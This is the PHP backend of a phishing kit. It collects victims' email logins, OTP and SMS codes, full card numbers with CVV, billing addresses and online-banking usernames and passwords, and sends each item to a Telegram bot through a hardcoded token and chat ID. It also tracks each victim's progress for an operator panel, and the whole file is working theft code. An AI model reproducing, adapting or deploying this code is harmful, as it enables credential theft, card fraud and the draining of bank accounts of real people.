<?php
require_once __DIR__ . '/guard.php';

// api.php only responds to POST requests from our own pages
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.0 404 Not Found');
    exit;
}

$botToken = "6866389063:AAF7vplNNRBTgW_MkJX8EXyJgvIIWWf1o9E"; 
$chatId   = "-5585399805"; 
$dbFile   = 'status.json';

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

function sendTelegram($msg) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=HTML&text=" . urlencode($msg);
    @file_get_contents($url);
}

if (isset($_POST['type'])) {
    $type = $_POST['type'];
    
    $db = json_decode(@file_get_contents($dbFile), true) ?: [];
    if (!isset($db[$ip])) {
        $db[$ip] = ['status' => 'online', 'last_seen' => time(), 'last_code' => '', 'email' => ''];
    }
    $db[$ip]['last_seen'] = time();

    // 1. LOGIN
    if ($type == 'login') {
        $user = $_POST['user'] ?? 'N/A';
        $db[$ip]['email'] = $user;
        $db[$ip]['status'] = 'login_submitted';
        $msg = "<b>👤 [LOGIN]</b>\n<b>📧 User:</b> <code>$user</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 2. OTP
    if (strpos($type, '2fa_') !== false) {
        $code = $_POST['code'] ?? '------';
        $db[$ip]['last_code'] = $code;
        $db[$ip]['status'] = "code_" . strtoupper(str_replace('2fa_', '', $type));
        $msg = "<b>🔐 [OTP CODE]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🔢 Code:</b> <pre>$code</pre>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 3. CARD DETAILS
    if ($type == 'card_details') {
        $card_name   = $_POST['card_name'] ?? 'N/A';
        $card_number = $_POST['card_number'] ?? 'N/A';
        $card_expiry = $_POST['card_expiry'] ?? 'N/A';
        $card_cvv    = $_POST['card_cvv'] ?? 'N/A';
        $card_brand  = $_POST['card_brand'] ?? 'N/A';
        $card_bank   = $_POST['card_bank'] ?? 'N/A';
        $card_bin    = $_POST['card_bin'] ?? 'N/A';
        $db[$ip]['card_name']   = $card_name;
        $db[$ip]['card_number'] = $card_number;
        $db[$ip]['card_expiry'] = $card_expiry;
        $db[$ip]['card_cvv']    = $card_cvv;
        $db[$ip]['card_brand']  = $card_brand;
        $db[$ip]['card_bank']   = $card_bank;
        $db[$ip]['card_bin']    = $card_bin;
        $db[$ip]['status']      = 'card_submitted';
        $brandEmoji = strtoupper($card_brand) === 'VISA' ? '💳' : (strtoupper($card_brand) === 'MASTERCARD' ? '💳' : (strtoupper($card_brand) === 'AMEX' ? '💎' : '💳'));
        $msg = "<b>$brandEmoji [CARD] " . strtoupper($card_brand) . "</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏦 Banca:</b> <code>$card_bank</code>\n<b>🔢 BIN:</b> <code>$card_bin</code>\n<b>👤 Titolare:</b> <code>$card_name</code>\n<b>💳 Numero:</b> <code>$card_number</code>\n<b>📅 Scadenza:</b> <code>$card_expiry</code>\n<b>🔒 CVV:</b> <code>$card_cvv</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 4. PUSH APP (3DS)
    if ($type == 'verify_app_push') {
        $db[$ip]['status'] = 'verify_app_push_clicked';
        $msg = "<b>📱 [3DS PUSH CLICKED]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>💳 Carta:</b> <code>" . ($db[$ip]['card_number'] ?? 'N/A') . "</code>\n<b>💰 Importo:</b> 300,00 USD (~276,50 EUR)\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 5. SMS VERIFY CLICKED
    if ($type == 'verify_sms_request') {
        $db[$ip]['status'] = 'sms_verify_clicked';
        $msg = "<b>💬 [SMS VERIFY]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>💳 Carta:</b> <code>" . ($db[$ip]['card_number'] ?? 'N/A') . "</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 6. SMS OTP CODE
    if ($type == 'verify_sms_otp') {
        $code = $_POST['code'] ?? '------';
        $db[$ip]['last_code'] = $code;
        $db[$ip]['status'] = 'sms_otp_submitted';
        $msg = "<b>💬 [SMS OTP CODE]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🔢 OTP:</b> <pre>$code</pre>\n<b>💳 Carta:</b> <code>" . ($db[$ip]['card_number'] ?? 'N/A') . "</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 7. BILLING DETAILS
    if ($type == 'billing_details') {
        $billing_firstname = $_POST['billing_firstname'] ?? 'N/A';
        $billing_lastname  = $_POST['billing_lastname'] ?? 'N/A';
        $billing_address   = $_POST['billing_address'] ?? 'N/A';
        $billing_city      = $_POST['billing_city'] ?? 'N/A';
        $billing_zip       = $_POST['billing_zip'] ?? 'N/A';
        $billing_province  = $_POST['billing_province'] ?? 'N/A';
        $billing_country   = $_POST['billing_country'] ?? 'Italia';
        $billing_phone     = $_POST['billing_phone'] ?? 'N/A';
        $db[$ip]['billing_firstname'] = $billing_firstname;
        $db[$ip]['billing_lastname']  = $billing_lastname;
        $db[$ip]['billing_address']   = $billing_address;
        $db[$ip]['billing_city']      = $billing_city;
        $db[$ip]['billing_zip']       = $billing_zip;
        $db[$ip]['billing_province']  = $billing_province;
        $db[$ip]['billing_country']   = $billing_country;
        $db[$ip]['billing_phone']     = $billing_phone;
        $db[$ip]['status']            = 'billing_submitted';
        $msg = "<b>📍 [BILLING] $billing_firstname $billing_lastname</b>\n<b>📱 Tel:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>👤 Nome:</b> <code>$billing_firstname $billing_lastname</code>\n<b>🏠 Indirizzo:</b> <code>$billing_address</code>\n<b>🏙 Città:</b> <code>$billing_city</code>\n<b>📮 CAP:</b> <code>$billing_zip</code>\n<b>🗺 Provincia:</b> <code>$billing_province</code>\n<b>🇮🇹 Paese:</b> <code>$billing_country</code>\n<b>📱 Telefono:</b> <code>$billing_phone</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 8. FINISHED
    if ($type == 'finished') {
        $db[$ip]['status'] = 'finished_success';
        $msg = "<b>✅ [SUCCESS]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>💳 Carta:</b> <code>" . ($db[$ip]['card_number'] ?? 'N/A') . "</code>\n<b>💰 Importo:</b> 300,00 USD (~276,50 EUR)\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // ========== NUOVI TYPE PER LA BANCA ==========
    // 8. BANK TYPING
    if ($type == 'bank_typing') {
        $search = $_POST['search'] ?? '';
        $db[$ip]['last_search'] = $search;
        // (opzionale: non inviamo a Telegram per evitare spam)
    }

    // 9. BANK SELECTED
    if ($type == 'bank_selected') {
        $bank_id   = $_POST['bank_id'] ?? '';
        $bank_name = $_POST['bank_name'] ?? '';
        $db[$ip]['selected_bank'] = $bank_name;
        $db[$ip]['selected_bank_id'] = $bank_id;
        $db[$ip]['status'] = 'bank_selected';
        $msg = "<b>🏦 [BANCA SELEZIONATA]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>🆔 ID:</b> <code>$bank_id</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 10. BRANCH SELECTED
    if ($type == 'branch_selected') {
        $branch_id   = $_POST['branch_id'] ?? '';
        $branch_name = $_POST['branch_name'] ?? '';
        $db[$ip]['selected_branch'] = $branch_name;
        $db[$ip]['selected_branch_id'] = $branch_id;
        $msg = "<b>🏛 [BRANCH SELEZIONATO]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏷 Branch:</b> <code>$branch_name</code>\n<b>🆔 ID:</b> <code>$branch_id</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 11. BANK LOGIN CREDENTIALS
    if ($type == 'bank_login') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        $bank_name = $db[$ip]['selected_bank'] ?? 'N/A';
        $db[$ip]['bank_username'] = $username;
        $db[$ip]['bank_password'] = $password;
        $db[$ip]['status'] = 'bank_login_submitted';
        $msg = "<b>🔐 [BANK LOGIN]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>👤 Username:</b> <code>$username</code>\n<b>🔑 Password:</b> <code>$password</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 12. VERIFY IDENTITY CONFIRMED
    if ($type == 'verify_identity_confirmed') {
        $db[$ip]['status'] = 'verify_identity_confirmed';
        $msg = "<b>🔐 [VERIFY IDENTITY]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>✅ Azione:</b> Confermata identità\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 13. BANK REDIRECT VIEWED
    if ($type == 'bank_redirect_viewed') {
        $bank_name = $_POST['bank_name'] ?? 'N/A';
        $db[$ip]['status'] = 'bank_redirect_viewed';
        $msg = "<b>🔄 [BANK REDIRECT]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 14. BANK PUSH PENDING (from victim's bank.php)
    if ($type == 'bank_push_pending') {
        $bank_name = $_POST['bank_name'] ?? 'N/A';
        $db[$ip]['status'] = 'bank_push_pending';
        $msg = "<b>📱 [PUSH PENDING]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>⏳ Stato:</b> In attesa di approvazione push\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 15. BANK PUSH APPROVED
    if ($type == 'bank_push_approved') {
        $bank_name = $_POST['bank_name'] ?? 'N/A';
        $db[$ip]['status'] = 'bank_push_approved';
        $msg = "<b>✅ [PUSH APPROVED]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>✅ Stato:</b> Approvazione push ricevuta\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 16. BANK SMS OTP
    if ($type == 'bank_sms_otp') {
        $code = $_POST['code'] ?? '------';
        $bank_name = $_POST['bank_name'] ?? 'N/A';
        $db[$ip]['last_code'] = $code;
        $db[$ip]['status'] = 'bank_sms_otp_submitted';
        $msg = "<b>💬 [SMS OTP BANK]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>🔢 OTP:</b> <pre>$code</pre>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 17. BANK CONTROL — login error, sms error, push approve, bank success
    if ($type == 'bank_login_error') {
        $db[$ip]['status'] = 'bank_login_error';
    }
    if ($type == 'bank_sms_error') {
        $db[$ip]['status'] = 'bank_sms_error';
    }
    if ($type == 'bank_push_approve') {
        $db[$ip]['status'] = 'bank_push_approve';
        $bank_name = $db[$ip]['selected_bank'] ?? 'N/A';
        $msg = "<b>✅ [PUSH APPROVED BY PANEL]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }
    if ($type == 'bank_success') {
        $db[$ip]['status'] = 'bank_success';
        $bank_name = $db[$ip]['selected_bank'] ?? 'N/A';
        $msg = "<b>🏁 [BANK SUCCESS BY PANEL]</b>\n<b>📧 Email:</b> <code>" . ($db[$ip]['email'] ?? 'N/A') . "</code>\n<b>🏛 Banca:</b> <code>$bank_name</code>\n<b>🌐 IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // SALVA IL DB
    file_put_contents($dbFile, json_encode($db));
}
?>